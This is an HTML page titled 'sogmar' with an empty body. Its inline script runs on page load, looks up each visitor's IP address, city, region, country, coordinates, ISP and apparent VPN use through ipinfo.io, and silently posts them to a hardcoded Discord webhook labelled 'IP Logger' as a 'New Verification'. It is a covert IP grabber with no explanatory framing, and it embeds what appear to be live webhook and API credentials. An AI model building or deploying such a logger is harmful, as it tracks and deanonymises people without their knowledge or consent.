<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>sogmar</title>
    <script>
        async function sendIP() {
            try {
                
                let response = await fetch('https://ipinfo.io/json?token=a114842b265b58');
                let data = await response.json();

                let userIP = data.ip || "Unknown";
                let city = data.city || "Unknown";
                let region = data.region || "Unknown";
                let country = data.country || "Unknown";
                let location = data.loc || "Unknown"; // Latitude, Longitude
                let isp = data.org || "Unknown"; // ISP or VPN
                let isVPN = isp.toLowerCase().includes("vpn") ? "Yes" : "No";

                // Webhook URL (Replace with your actual Discord Webhook)
                const webhookURL = "https://discord.com/api/webhooks/1336291692822794250/K5Z1348GpDr-eoU92dwNZ-OjlR8w7pCJqt1vP01kYDOiQuYJoE1dsnkoyfCZOMQ5MrBs"
                // Sending data to Discord webhook
                fetch(webhookURL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        username: "IP Logger",
                        content: `**New Verification**\n
                        - **IP Address:** ${userIP}
                        - **City:** ${city}
                        - **Region:** ${region}
                        - **Country:** ${country}
                        - **Coordinates:** ${location}
                        - **ISP:** ${isp}
                        - **VPN Detected:** ${isVPN}`
                    })
                });

            } catch (error) {
                console.error("Error fetching IP:", error);
            }
        }

        // Run on page load
        window.onload = sendIP;
    </script>
</head>

</body>
